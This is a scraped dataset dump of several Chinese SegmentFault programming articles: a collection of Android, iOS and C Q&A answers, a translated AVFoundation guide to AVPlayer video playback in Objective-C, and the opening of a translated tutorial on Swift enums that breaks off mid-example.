<h5><a href=""http://segmentfault.com/q/1010000003849057/a-1020000003849179"" rel=""nofollow noreferrer"">OnItemClickListener是接口有没有被子类继承？</a></h5>
<p>OnItemClickListener是接口，不是内部类。接口需要你去implement。<br>一般的做法是：<code>listview.setOnItemClickListener(mListener)</code>，然后定义这个listener，并实现其接口规定的方法。<br>不理解你如此定义 <code>new ListView. OnItemClickListener()</code> 的意图，但之所以出错，也许你是没有导入 <code>import android.widget.AdapterView.OnItemClickListener</code>。</p>
<h3>其它Android相关问题</h3>
<h5><a href=""http://segmentfault.com/q/1010000004042130/a-1020000004042558"" rel=""nofollow noreferrer"">保存在Application子类中的全局变量什么情况下会丢失？</a></h5>
<p>可以继承 <code>Application</code> 类以保存全局的“application state”。因为这些变量是全局的，所以应用的所有组件都可以获取/更改这些变量。多数情况下，静态单例模式可以提供相同的功能。</p>
<h5><a href=""http://segmentfault.com/q/1010000003970708/a-1020000003970819"" rel=""nofollow noreferrer"">命令行程序如何获取系统（Android）已安装应用信息？</a></h5>
<pre><code class=""shell"">shell:/ $ pm list packages
shell:/ $ pm list packages -f
shell:/ $ dumpsys package com.tencent.mm | grep versionName</code></pre>
<h5><a href=""http://segmentfault.com/q/1010000002907252/a-1020000003952655"" rel=""nofollow noreferrer"">Android Studio中如何开发系统应用？</a></h5>
<p>这样的 app 要放在 Android bsp 相应的目录中，通过 Android.mk 文件编译，这才能获取某些特殊权限，这些权限是通过集成编译器无法获取的。</p>
<h2>Linux</h2>
<h5><a href=""http://segmentfault.com/q/1010000003992911"" rel=""nofollow noreferrer"">Linux Shell变量替换操作</a></h5>
<h5><a href=""http://segmentfault.com/q/1010000003961169/a-1020000003961191"" rel=""nofollow noreferrer"">在linux上添加crontab任务的问题</a></h5>
<h2>iOS</h2>
<h5><a href=""http://segmentfault.com/q/1010000003967071/a-1020000003967789"" rel=""nofollow noreferrer"">如何自定义一个UIView？</a></h5>
<ul>
<li><p>需要在Storyboard中把UIView的类名修改为你自定义的类名：点击位于Storyboard的CustomView，在右侧的选项卡中，点击Identity Inspector选项卡，然后修改Custom Class；</p></li>
<li><p>然后把这个CustomView从Storyboard中拖到ViewController中，建立IBOutlet；</p></li>
<li><p>这样你就拥有了这个CustomView的实例了，然后就可以修改它的属性，调用它的方法。</p></li>
</ul>
<p>可以参考<a href=""https://github.com/li2/Learning_iOS_Programming/tree/master/CustomView"" rel=""nofollow noreferrer"">这个demo工程</a>。如果你是想通过Storyboard来完成这件事情，就用不着initWithframe，这个方法的目的是用代码生成一个指定frame的view。</p>
<h5><a href=""http://segmentfault.com/q/1010000003965903/a-1020000003966212"" rel=""nofollow noreferrer"">自定义cell中的图片的约束应该如何定义？</a></h5>
<h5><a href=""http://segmentfault.com/q/1010000003965674/a-1020000003966161"" rel=""nofollow noreferrer"">如何仅改变iOS某一个控制器导航栏的隐藏或透明度？</a></h5>
<h5><a href=""http://segmentfault.com/q/1010000003961338/a-1020000003962248"" rel=""nofollow noreferrer"">自定义的UICollectionViewCell, for循环创建btn, 用代理设置btn的绑定事件无效怎么回事?</a></h5>
<pre><code class=""c"">@interface MainViewController () &lt;FristSectionCollectionViewCellDelegate&gt;
self.fristSectionCollectionViewCell.delegate = self;</code></pre>
<p>虽然你实现了delegate相应的方法，但如果不给delegate赋值，那么如下的判断将为false：<br><code>if ([_delegate respondsToSelector:@selector(choseTerm:)])</code>。<a href=""https://github.com/li2/Learning_iOS_Programming/tree/master/CollectionViewButtonDelegateTest"" rel=""nofollow noreferrer"">一个demo</a>。</p>
<h5><a href=""http://segmentfault.com/q/1010000003838767/a-1020000003838864"" rel=""nofollow noreferrer"">如何找出不必要的约束constraints in following list is one you don't want</a></h5>
<p>严格讲，上述提示并不是出错的约束，而是多余的约束，比如设置了上、下边距，同时又pin了高度，就会导致出现这样的问题。感觉你的问题应该是设置了UIView:0x166ea400高度为37，然后又设置它等于另一个UIView:0x16526700宽度的0.0894。这样就冗余了。<br>而排查的方法是，在storyboard中挨个找UIView，37是个很好的切入点，我是这样做的，很笨。</p>
<h5><a href=""http://segmentfault.com/q/1010000003729136/a-1020000003734992"" rel=""nofollow noreferrer"">UICollectionView 如何显示它全部的内容？</a></h5>
<p>如果你想实现“不需要拖动就可以显示UICollectionView的全部内容”，前提是你为UICollectionView分配的layout必须要容得下所有的UICollectionViewCell.<br>如果满足这个前提，比如你想显示的UICollectionView包含9个cell，每个cell大小相同，就像一个九宫格。<br>你必须设置每个cell的frame size：</p>
<pre><code class=""c"">// 设置指定位置cell的frame size
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
    if (collectionView == self.myCollectionView) {
        CGRect collectionViewFrame = self.myCollectionView.frame;
        CGFloat cellWidth = collectionViewFrame.size.width/kCollectionViewCols;
        CGFloat cellHeight = collectionViewFrame.size.height/kCollectionViewRows;
        return CGSizeMake(cellWidth, cellHeight);
    }
}</code></pre>
<h5><a href=""http://segmentfault.com/q/1010000002647958/a-1020000002647984"" rel=""nofollow noreferrer"">子view根据父view 垂直居中</a></h5>
<p>根据父view的<code>frame.origin.x</code>和<code>frame.size.width</code>，以及子view的宽度，计算子view的横坐标x，应该是<code>父x + 父w/2 - 子w/2</code>，然后<code>CGRectMake</code>。</p>
<h2>C</h2>
<h5><a href=""http://segmentfault.com/q/1010000003955029/a-1020000003955335"" rel=""nofollow noreferrer"">指针作为函数的参数</a></h5>
<h5><a href=""http://segmentfault.com/q/1010000003848156/a-1020000003848465"" rel=""nofollow noreferrer"">sizeof是如何计算数组大小的？</a></h5>
<p>严格讲，你这句话『sizeof(arr) =10; 这里只是把地址传给sizeof啊』是错误的，<strong>你传的是数组名，数组名不等价于地址</strong>。<br>编译器用数组名标记数组的属性，比如具有确定数量的元素。而你说的<strong>地址</strong>，也就是<strong>指针</strong>，只是一个标量值。<br>只有当数组名在表达式中使用时，编译器才会为它产生一个指针常量。而只有以下两种情况，才不被当做指针常量：</p>
<ul>
<li><p>sizeof(数组名)：返回数组长度（所占的字节数，不是数组元素个数），而不是指向数组的指针的长度。</p></li>
<li><p>&amp;数组名：产生一个指向数组的指针，而不是一个指向某个指针常量的指针。</p></li>
</ul>
<hr>
<p>版权声明：《分类整理我在 SegmentFault 上针对某些问题作的回答》由 <a>WeiYi.Li</a> 在 2015年11月29日写作。著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 <br>文章链接：<a href=""http://li2.me/2015/11/my-sf-answers.html"" rel=""nofollow noreferrer"">http://li2.me/2015/11/my-sf-a...</a></p>

                ", 分类整理我在SF上针对某些问题作的回答,1531972080,146,1,319,1,1,https://segmentfault.com/a/1190000004063006
132,1,0,6,"
                    
<p>原文链接：<a href=""http://1199game.com/2016/10/avfoundation-2/"" rel=""nofollow noreferrer"">chenjiang3的技术博客</a><br>控制assets的播放，你可以使用AVPlayer对象。在播放的过程中，你可以使用AVPlayerItem对象来管理asset的呈现，AVPlayerItemTrack来管理track。要显示视频，需要使用AVPlayerLayer。</p>
<h1>播放Assets</h1>
<p>一个播放器就是控制asset播放的对象，比如开始和结束，seek到指定的时间。可以使用AVPlayer来播放单个asset，用AVQueuePlayer来播放多个连续的asset。<br>一个player向你提供播放的信息，如果需要，你通过player的状态同步显示到界面上。你也可以直接把player的输出显示笑傲指定的动画层（AVPlayerLayer或者AVSynchronizedLayer），想知道更多关于layer的信息，请查看<a href=""https://developer.apple.com/library/prerelease/ios/documentation/Cocoa/Conceptual/CoreAnimation_guide/Introduction/Introduction.html#//apple_ref/doc/uid/TP40004514"" rel=""nofollow noreferrer"">Core Animation Programming Guide</a></p>
<pre><code>多个layer的情况：你可以创建多个AVPlayerLayer对象，但是只有最近创建的layer才会显示视频画面。</code></pre>
<p>虽然是播放asset，但是不能直接把asset传给AVPlayer对象，你应该提供AVPlayerItem对象给AVPlayer。一个player item管理着和它相关的asset。一个player item包括player item tracks-（AVPlayerItemTrack对象，表示asset中的tracks）。他们之间的关系如下图：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000004842277"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>这表明你可以同时用不同的player播放同一个asset，如下图显示，两个不同的player播放同一个asset。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000004842277"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br>你可以用一个存在asset直接初始化player，或者直接用URL初始化。和AVAsset一样，简单的初始化一个player并不表示可以马上进行播放，你需要观察它的status（通过kvo）来决定是否可以播放。</p>
<h1>处理不同类型的asset</h1>
<p>配置asset的方式由需要播放的asset的类型决定的。概括的说，有两种方式：基于文件的asset，基于流式的（http live streaming format）</p>
<h4>加载基于文件的asset，有如下几步：</h4>
<p>· 使用AVURLAsset创建一个asset。&lt;p&gt;<br>· 使用创建的asset来创建一个AVPlayerItem对象item&lt;p&gt;<br>· item和AVPlayer关联&lt;p&gt;<br>· 等待item的状态，知道可以播放。</p>
<h4>创建基于HTTP live stream的播放器。</h4>
<p>用url初始化一个AVPlayerItem对象。（http live stream的情况下不能直接创建AVAsset对象）</p>
<pre><code>NSURL *url = [NSURL URLWithString:@""&lt;#Live stream URL#&gt;];
// You may find a test stream at &lt;http://devimages.apple.com/iphone/samples/bipbop/bipbopall.m3u8&gt;.
self.playerItem = [AVPlayerItem playerItemWithURL:url];
[playerItem addObserver:self forKeyPath:@""status"" options:0 context:&amp;ItemStatusContext];
self.player = [AVPlayer playerWithPlayerItem:playerItem];</code></pre>
<p>当你关联一个player item到player的时候，这个播放器开始准备播放。当它可以播放的时候，player item会创建AVAsset和AVAssetTrack对象，这些对象可以用来检查live stream的内容。<br>为了获取stream的时间，可以通过kvo的方式观察player item的duration的属性。当可以播放的时候，这个属性被设置为正确的值，这时就可以获取时间。</p>
<pre><code>注意:只能在iOS4.3之后使用player item的duration属性。下面这种获取duration的方法适用于所有的iOS系统版本：当player item的状态变为AVPlayerItemStatusReadyToPlay时，duration可以通过下面代码获取
[[[[[playerItem tracks] objectAtIndex:0] assetTrack] asset] duration];</code></pre>
<p>如果仅仅是想播放一个live stream，可以直接用下面的简短代码实现：</p>
<pre><code>self.player = [AVPlayer playerWithURL:&lt;#Live stream URL#&gt;];
[player addObserver:self forKeyPath:@""status"" options:0 context:&amp;PlayerStatusContext];</code></pre>
<p>正如assets和items一样，初始化一个player之后并不表明可以马上播放，你需要观察player的status属性，当status变为AVPlayerStatusReadyToPlay时表示可以播放了，你也需要观察curretItem属性来访问player item。</p>
<p>如果你不能确定你用的url是什么类型，可以用下面的方法检测：<br>1、尝试用url初始化AVURLAsset，然后load它的tracks key，如果tracks load 成功，表明你可以用这个asset创建player item。<br>2、如果第一步失败，直接用url创建AVPlayerItem，观察status属性，看是否有可播放的状态。</p>
<h1>播放一个item</h1>
<p>如果想要播放，你可以想player发送play消息，如下代码：</p>
<pre><code>- (IBAction)play:sender {
    [player play];
}</code></pre>
<p>除了播放之外，还可以管理player的各种信息，比如rate和播放头，你也可以监控player的状态，这很有用，比如说你需要根据播放的状态来更新界面。</p>
<h2>改变播放的rate</h2>
<p>可以改变播放的rate，代码如下：</p>
<pre><code>aPlayer.rate = 0.5;
aPlayer.rate = 2.0;</code></pre>
<p>rate=1.0表示正常的播放。0.0表示暂停。<br>player item支持逆向播放，当rate设置为负数的时候就是逆向播放.playeritem的 canPlayReverse 表示rate为-1.0，canPlaySlowReverse表示rate的范围是-0.0到-1.0，canPlayFastReverse表示rate小于-1.0f。</p>
<h2>seeking-重定位播放头</h2>
<p>可以使用seekToTime：重定位播放头到指定的时间，如下代码：</p>
<pre><code>CMTime fiveSecondsIn = CMTimeMake(5, 1);
[player seekToTime:fiveSecondsIn];</code></pre>
<p>seekTime:不能精确定位，如果需要精确定位，可以使用seekToTime:toleranceBefore:toleranceAfter:，代码如下：</p>
<pre><code>CMTime fiveSecondsIn = CMTimeMake(5, 1);
[player seekToTime:fiveSecondsIn toleranceBefore:kCMTimeZero toleranceAfter:kCMTimeZero];</code></pre>
<p>当tolerance＝0的时候，framework需要进行大量解码工作，比较耗性能，所以，只有当你必须使用的时候才用这个方法，比如开发一个复杂的多媒体编辑应用，这需要精确的控制。</p>
<p>当播放结束后，播放头移动到playerItem的末尾，如果此时调用play方法是没有效果的，应该先把播放头移到player item起始位置。如果需要实现循环播放的功能，可以监听通知AVPlayerItemDidPlayToEndTimeNotification，当收到这个通知的时候，调用seekToTime：把播放头移动到起始位置，代码如下：</p>
<pre><code>// Register with the notification center after creating the player item.
    [[NSNotificationCenter defaultCenter]
        addObserver:self
        selector:@selector(playerItemDidReachEnd:)
        name:AVPlayerItemDidPlayToEndTimeNotification
        object:&lt;#The player item#&gt;];
 
- (void)playerItemDidReachEnd:(NSNotification *)notification {
    [player seekToTime:kCMTimeZero];
}</code></pre>
<h2>播放多个items</h2>
<p>可以使用AVQueuePlayer播放多个items，AVQueuePlayer是AVPlayer的子类，可以用一个数组来初始化一个AVQueuePlayer对象。代码如下：</p>
<pre><code>NSArray *items = &lt;#An array of player items#&gt;;
AVQueuePlayer *queuePlayer = [[AVQueuePlayer alloc] initWithItems:items];</code></pre>
<p>和AVPlayer一样，直接调用play方法来播放，queue player顺序播放队列中的item，如果想要跳过一个item，播放下一个item，可以调用方法advanceToNextItem。</p>
<p>可以对队列进行插入和删除操作，调用方法insertItem:afterItem:, removeItem:, 和 removeAllItems。正常情况下当插入一个item之前，应该检查是否可以插入，通过使用canInsertItem:afterItem:方法，第二个参数传nil，代码如下：</p>
<pre><code>AVPlayerItem *anItem = &lt;#Get a player item#&gt;;
if ([queuePlayer canInsertItem:anItem afterItem:nil]) {
    [queuePlayer insertItem:anItem afterItem:nil];
}</code></pre>
<h2>监测播放状态</h2>
<p>可以监测player和player item的状态，这个非常有用。比如：<br><br>· 如果用户切换到其他应用程序，则需要把player的rate设为0.0 <br><br>· 如果播放的是远程媒体，当收到更多的数据的时候，player的loadedTimeRange和seekableTimeRange属性将会不断改变。<br><br>· 当player播放的是http live stream的时候，player的currentItem会不断改变。<br><br>· 播放http live stream的时候，player item的tracks属性也不断改变。这会发生在player改变编码方式的时候。<br><br>· 当播放失败的时候，player或者player item的status属性也会改变。<br></p>
<p>可以使用kvo来监测上述改变。</p>
<pre><code>注意：只能在主线程注册和取消kvo</code></pre>
<h3>status改变后的处理方式</h3>
<p>当player或者player item的状态status改变，系统会发送一个kvo的notification，如果一个对象由于一些原因不能播放，stauts会变成AVPlayerStatusFailed 或者 AVPlayerItemStatusFailed ，在这种情况下，这个对象的error属性会被附上一个error类型的对象，这个error对象描述了失败的原因。</p>
<p>AV Foundation不会指定这个notification是由哪个线程发出的，所以，如果你要更新UI，就必须确保更新的代码在主线程中调用，下面的代码表示收到status更新的处理方式：</p>
<pre><code>- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object
                        change:(NSDictionary *)change context:(void *)context {
 
    if (context == &lt;#Player status context#&gt;) {
        AVPlayer *thePlayer = (AVPlayer *)object;
        if ([thePlayer status] == AVPlayerStatusFailed) {
            NSError *error = [&lt;#The AVPlayer object#&gt; error];
            // Respond to error: for example, display an alert sheet.
            return;
        }
        // Deal with other status change if appropriate.
    }
    // Deal with other change notifications if appropriate.
    [super observeValueForKeyPath:keyPath ofObject:object
           change:change context:context];
    return;
}</code></pre>
<h3>监听视频准备播放的状态</h3>
<p>可以监听AVPlayerLayer的readyForDisplay属性，当layer有可显示的内容时，会发送一个notification。</p>
<h3>跟踪时间</h3>
<p>可以使用addPeriodicTimeObserverForInterval:queue:usingBlock: 或者 addBoundaryTimeObserverForTimes:queue:usingBlock:来跟踪播放的进度，根据这个进度，你可以更新UI，比如播放了多少时间，还剩多少时间，或者其他的UI状态。<br><br>· addPeriodicTimeObserverForInterval:queue:usingBlock:，这个方法传入一个CMTime结构的时间区间，每隔这个时间段的时候，block会回调一次，开始和结束播放的时候block也会回调一次。<br><br>· addBoundaryTimeObserverForTimes:queue:usingBlock:,这个放传入一个CMTime结构的数组，当播放到数组里面的时间点的时候，block会回调。<br><br>这两个方法都返回一个id类型的对象，这个对象必须一直被持有。可以使用removeTimeObserver:取消这个观察者。</p>
<p>对于这两个方法，AVFoundation不会保证每次时间点到了的时候都会回调block，如果前面回调的block没有执行完的时候，下一次就不会回调。所以，必须保证在block里面的逻辑不能太耗时。下面是使用的例子：</p>
<pre><code>// Assume a property: @property (strong) id playerObserver;
 
Float64 durationSeconds = CMTimeGetSeconds([&lt;#An asset#&gt; duration]);
CMTime firstThird = CMTimeMakeWithSeconds(durationSeconds/3.0, 1);
CMTime secondThird = CMTimeMakeWithSeconds(durationSeconds*2.0/3.0, 1);
NSArray *times = @[[NSValue valueWithCMTime:firstThird], [NSValue valueWithCMTime:secondThird]];
 
self.playerObserver = [&lt;#A player#&gt; addBoundaryTimeObserverForTimes:times queue:NULL usingBlock:^{
 
    NSString *timeDescription = (NSString *)
        CFBridgingRelease(CMTimeCopyDescription(NULL, [self.player currentTime]));
    NSLog(@""Passed a boundary at %@"", timeDescription);
}];</code></pre>
<h3>播放结束</h3>
<p>可以向通知中心注册 AVPlayerItemDidPlayToEndTimeNotification 通知，当播放结束的时候可以收到一个结束的通知。代码：</p>
<pre><code>[[NSNotificationCenter defaultCenter] addObserver:&lt;#The observer, typically self#&gt;
                                         selector:@selector(&lt;#The selector name#&gt;)
                                             name:AVPlayerItemDidPlayToEndTimeNotification
                                           object:&lt;#A player item#&gt;];</code></pre>
<h1>完整的例子：用AVPlayerLayer播放一个video</h1>
<p>下面的代码向你展示如何使用AVPLayer播放一个video文件，步骤如下：<br><br>1、用AVPlayerLayer配置一个view    <br><br>2、创建一个AVPlayer    <br><br>3、用video文件创建一个AVPlayerItem对象，并且用kvo观察他的status    <br><br>4、    当收到item的状态变成可播放的时候，播放按钮启用<br><br>5、    播放，结束之后把播放头设置到起始位置<br></p>
<h2>player view</h2>
<p>为了播放一个视频，需要个view，这个view的layer是AVPlayerLayer对象。可以创建一个子类实现这个需求。代码：</p>
<pre><code>#import &lt;UIKit/UIKit.h&gt;
#import &lt;AVFoundation/AVFoundation.h&gt;
 
@interface PlayerView : UIView
@property (nonatomic) AVPlayer *player;
@end
 
@implementation PlayerView
+ (Class)layerClass {
    return [AVPlayerLayer class];
}
- (AVPlayer*)player {
    return [(AVPlayerLayer *)[self layer] player];
}
- (void)setPlayer:(AVPlayer *)player {
    [(AVPlayerLayer *)[self layer] setPlayer:player];
}
@end</code></pre>
<h2>View controller</h2>
<p>同时你需要一个view controller，代码如下：</p>
<pre><code>@class PlayerView;
@interface PlayerViewController : UIViewController
 
@property (nonatomic) AVPlayer *player;
@property (nonatomic) AVPlayerItem *playerItem;
@property (nonatomic, weak) IBOutlet PlayerView *playerView;
@property (nonatomic, weak) IBOutlet UIButton *playButton;
- (IBAction)loadAssetFromFile:sender;
- (IBAction)play:sender;
- (void)syncUI;
@end</code></pre>
<p>syncUI方法的作用是根据player的status来更新播放按钮，实现如下：</p>
<pre><code>- (void)syncUI {
    if ((self.player.currentItem != nil) &amp;&amp;
        ([self.player.currentItem status] == AVPlayerItemStatusReadyToPlay)) {
        self.playButton.enabled = YES;
    }
    else {
        self.playButton.enabled = NO;
    }
}</code></pre>
<p>在viewdidload里面调用syncUI，确保刚开始显示的页面的时候按钮是不可用的。代码如下：</p>
<pre><code>- (void)viewDidLoad {
    [super viewDidLoad];
    [self syncUI];
}</code></pre>
<p>其他的属性和方法在接下来的文字说明。</p>
<h2>创建一个asset</h2>
<p>通过URL创建一个AVURLAsset对象。代码如下：</p>
<pre><code>- (IBAction)loadAssetFromFile:sender {
 
    NSURL *fileURL = [[NSBundle mainBundle]
        URLForResource:&lt;#@""VideoFileName""#&gt; withExtension:&lt;#@""extension""#&gt;];
 
    AVURLAsset *asset = [AVURLAsset URLAssetWithURL:fileURL options:nil];
    NSString *tracksKey = @""tracks"";
 
    [asset loadValuesAsynchronouslyForKeys:@[tracksKey] completionHandler:
     ^{
         // The completion block goes here.
     }];
}</code></pre>
<p>在完成的block里面，用asset创建一个AVPlayerItem对象和一个AVPlayer对象，并且把player设为player view的属性。和创建一个asset一样，简单的创建一个player item并不意味着可以马上使用，可以用kvo观察player item 的status来判断是否可以开始播放，这个kvo的设置应该在player item和player关联之前设置。代码如下：</p>
<pre><code>// Define this constant for the key-value observation context.
static const NSString *ItemStatusContext;
 
// Completion handler block.
         dispatch_async(dispatch_get_main_queue(),
            ^{
                NSError *error;
                AVKeyValueStatus status = [asset statusOfValueForKey:tracksKey error:&amp;error];
 
                if (status == AVKeyValueStatusLoaded) {
                    self.playerItem = [AVPlayerItem playerItemWithAsset:asset];
                     // ensure that this is done before the playerItem is associated with the player
                    [self.playerItem addObserver:self forKeyPath:@""status""
                                options:NSKeyValueObservingOptionInitial context:&amp;ItemStatusContext];
                    [[NSNotificationCenter defaultCenter] addObserver:self
                                                              selector:@selector(playerItemDidReachEnd:)
                                                                  name:AVPlayerItemDidPlayToEndTimeNotification
                                                                object:self.playerItem];
                    self.player = [AVPlayer playerWithPlayerItem:self.playerItem];
                    [self.playerView setPlayer:self.player];
                }
                else {
                    // You should deal with the error appropriately.
                    NSLog(@""The asset's tracks were not loaded:\n%@"", [error localizedDescription]);
                }
            });</code></pre>
<h3>player item的status改变时的处理</h3>
<p>当player item的status改变时，view controller会收到一个通知消息，AVFoundation并不指定这个消息是由哪个线程发出的。如果你要更新ui，必须确保更新ui的代码在主线程中。下面的代码显示更新ui的逻辑：</p>
<pre><code>- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object
                        change:(NSDictionary *)change context:(void *)context {
 
    if (context == &amp;ItemStatusContext) {
        dispatch_async(dispatch_get_main_queue(),
                       ^{
                           [self syncUI];
                       });
        return;
    }
    [super observeValueForKeyPath:keyPath ofObject:object
           change:change context:context];
    return;
}</code></pre>
<h3>播放</h3>
<p>播放很简单，直接向player发送play消息即可。代码如下：</p>
<pre><code>- (IBAction)play:sender {
    [player play];
}</code></pre>
<p>这样的情况只能播放一次，当播放结束的时候，再调用play方法是没有效果的，如果你要重新播放，需要向通知中心注册AVPlayerItemDidPlayToEndTimeNotification消息，当收到播放结束的消息的时候，调用seekToTime：把播放头移动到起始位置，这样再调用play的时候就可以重新播放了。代码如下：</p>
<pre><code>// Register with the notification center after creating the player item.
    [[NSNotificationCenter defaultCenter]
        addObserver:self
        selector:@selector(playerItemDidReachEnd:)
        name:AVPlayerItemDidPlayToEndTimeNotification
        object:[self.player currentItem]];
 
- (void)playerItemDidReachEnd:(NSNotification *)notification {
    [self.player seekToTime:kCMTimeZero];
}</code></pre>
<h6>参考文献：</h6>
<p><a href=""https://developer.apple.com/library/prerelease/ios/documentation/AudioVideo/Conceptual/AVFoundationPG/Articles/02_Playback.html#//apple_ref/doc/uid/TP40010188-CH3-SW8"" rel=""nofollow noreferrer"">https://developer.apple.com/library/prerelease/ios/documentation/AudioVideo/Conceptual/AVFoundationPG/Articles/02_Playback.html#//apple_ref/doc/uid/TP40010188-CH3-SW8</a></p>

                ", AVFoundation编程指南2-用AVPlayer播放视频,1531972082,448,1,386,1,1,https://segmentfault.com/a/1190000004054258
133,1,0,6,"
                    
<blockquote><p>作者：Benedikt Terhechte，<a href=""http://appventure.me/2015/10/17/advanced-practical-enum-examples/"" rel=""nofollow noreferrer"">原文链接</a>，原文日期：2015-10-17<br>译者：<a href=""http://www.jianshu.com/users/3b40e55ec6d5/latest_articles"" rel=""nofollow noreferrer"">小锅</a>，<a href=""http://www.jianshu.com/users/596f2ba91ce9/latest_articles"" rel=""nofollow noreferrer"">pmst</a>；校对：<a href=""http://codebuild.me/"" rel=""nofollow noreferrer"">shanks</a>；定稿：<a href=""http://codebuild.me/"" rel=""nofollow noreferrer"">shanks</a></p></blockquote>
<blockquote><p>译者注：作为一个走心且有逼格的翻译组，我们对本篇文章中的代码都进行了验证，并且写了将代码分为上下两篇做成了 playground，代码中有详尽的注释。可以到<a href=""https://github.com/colourful987/Topic_Demo/tree/master/Advanced%20%26%20Practical%20Enum%20usage%20in%20Swift"" rel=""nofollow noreferrer"">这个github地址上进行下载</a>，这个代码由翻译组的另一位小伙伴 <a href=""http://blog.csdn.net/colouful987"" rel=""nofollow noreferrer"">ppt</a> 提供。</p></blockquote>
<p>本文是一篇详细且具有实战意义的教程，涵盖几乎所有枚举(<code>Enum</code>)知识点，为你解答<code>Swift</code>中枚举的应用场合以及使用方法。</p>
<p>和<a href=""http://appventure.me/2015/08/20/swift-pattern-matching-in-detail/"" rel=""nofollow noreferrer"">switch语句</a>类似，<code>Swift</code>中的枚举乍看之下更像是<code>C</code>语言中枚举的进阶版本，即允许你定义一种类型，用于表示普通事情中某种用例。不过深入挖掘之后，凭借<code>Swift</code>背后特别的设计理念，相比较<code>C</code>语言枚举来说其在实际场景中的应用更为广泛。特别是作为强大的工具，<code>Swift</code>中的枚举能够清晰表达代码的意图。</p>
<p>本文中，我们将首先了解基础语法和使用枚举的可能性，接着通过实战教你如何以及何时使用枚举。最后我们还会大致了解下<code>Swift</code>标准库中枚举是如何被使用的。</p>
<p>正式开始学习之前，先给出枚举的定义。之后我们将回过头再来讨论它。</p>
<blockquote><p>枚举声明的类型是囊括可能状态的有限集，且可以具有附加值。通过内嵌(<em>nesting</em>),方法(<em>method</em>),关联值(<em>associated values</em>)和模式匹配(<em>pattern matching</em>),枚举可以分层次地定义任何有组织的数据。</p></blockquote>
<h2>深入理解(Diving In)</h2>
<p>简要概述如何定义和使用枚举。</p>
<h3>定义基本的枚举类型(Defining Basic Enums)</h3>
<p>试想我们正在开发一款游戏，玩家能够朝四个方向移动。所以喽，玩家的运动轨迹受到了限制。显然，我们能够使用枚举来表述这一情况:</p>
<pre><code>
enum Movement{
    case Left
    case Right
    case Top
    case Bottom
}
</code></pre>
<p>紧接着，你可以使用<a href=""http://appventure.me/2015/08/20/swift-pattern-matching-in-detail/"" rel=""nofollow noreferrer"">多种模式匹配结构</a>获取到<code>Movement</code>的枚举值，或者按照特定情况执行操作:</p>
<pre><code>
let aMovement = Movement.Left

// switch 分情况处理
switch aMovement{
case .Left: print(""left"")
default:()
}

// 明确的case情况
if case .Left = aMovement{
    print(""left"")
}

if aMovement == .Left { print(""left"") }
</code></pre>
<p>案例中，我们无须明确指出<code>enum</code>的实际名称(即<code>case Move.Left:print(""Left"")</code>)。因为类型检查器能够自动为此进行类型推算。这对于那些<strong>UIKit</strong>以及<strong>AppKit</strong>中错综复杂的枚举是灰常有用的。</p>
<h3>枚举值(Enum Values)</h3>
<p>当然，你可能想要为<code>enum</code>中每个<code>case</code>分配一个值。这相当有用，比如枚举自身实际与某事或某物挂钩时，往往这些东西又需要使用不同类型来表述。在<code>C</code>语言中，你只能为枚举<code>case</code>分配整型值，而<code>Swift</code>则提供了更多的灵活性。</p>
<pre><code>
// 映射到整型
enum Movement: Int {
    case Left = 0
    case Right = 1
    case Top = 2
    case Bottom = 3
}

// 同样你可以与字符串一一对应
enum House: String {
    case Baratheon = ""Ours is the Fury""
    case Greyjoy = ""We Do Not Sow""
    case Martell = ""Unbowed, Unbent, Unbroken""
    case Stark = ""Winter is Coming""
    case Tully = ""Family, Duty, Honor""
    case Tyrell = ""Growing Strong""
}

// 或者float double都可以(同时注意枚举中的花式unicode)
enum Constants: Double {
    case π = 3.14159
    case e = 2.71828
    case φ = 1.61803398874
    case λ = 1.30357
}
</code></pre>
<p>对于<code>String</code>和<code>Int</code>类型来说，你甚至可以忽略为枚举中的<code>case</code>赋值，<code>Swift</code>编译器也能正常工作。</p>
<pre><code>
// Mercury = 1, Venus = 2, ... Neptune = 8
enum Planet: Int {
    case Mercury = 1, Venus, Earth, Mars, Jupiter, Saturn, Uranus, Neptune
}

// North = ""North"", ... West = ""West""
// 译者注: 这个是swift2.0新增语法
enum CompassPoint: String {
    case North, South, East, West
}
</code></pre>
<p><code>Swift</code>枚举中支持以下四种关联值类型:</p>
<ul>
<li><p>整型(Integer)</p></li>
<li><p>浮点数(Float Point)</p></li>
<li><p>字符串(String)</p></li>
<li><p>布尔类型(Boolean)</p></li>
</ul>
<p>因此你无法<a><sup>1<sup></sup></sup></a>为枚举分配诸如<code>CGPoint</code>类型的值。</p>
<p>倘若你想要读取枚举的值，可以通过<code>rawValue</code>属性来实现:</p>
<pre><code>
let bestHouse = House.Stark
print(bestHouse.rawValue)
// prints ""Winter is coming""
</code></pre>
<p>不过某种情形下，你可能想要通过一个已有的<code>raw value</code>来创建一个<code>enum case</code>。这种情况下，枚举提供了一个指定构造方法:</p>
<pre><code>
enum Movement: Int {
    case Left = 0
    case Right = 1
    case Top = 2
    case Bottom = 3
}
// 创建一个movement.Right 用例,其raw value值为1
let rightMovement = Movement(rawValue: 1)
</code></pre>
<p>倘若使用<code>rawValue</code>构造器，切记它是一个可失败构造器(<a href=""https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/Declarations.html#//apple_ref/doc/uid/TP40014097-CH34-ID376"" rel=""nofollow noreferrer"">failable initializer</a>)。换言之，构造方法返回值为<a href=""http://appventure.me/2014/06/13/swift-optionals-made-simple/"" rel=""nofollow noreferrer"">可选类型值</a>,因为有时候传入的值可能与任意一个<code>case</code>都不匹配。比如<code>Movement(rawValue:42)</code>。</p>
<p>如果你想要以底层 C 二进制编码形式呈现某物或某事，使得更具可读性，这是一个非常有用的功能。例如，可以看一下<a href=""https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man2/kqueue.2.html"" rel=""nofollow noreferrer"">BSD kqeue library</a>中的<strong>VNode Flags</strong>标志位的编码方式:</p>
<pre><code>
enum VNodeFlags : UInt32 {
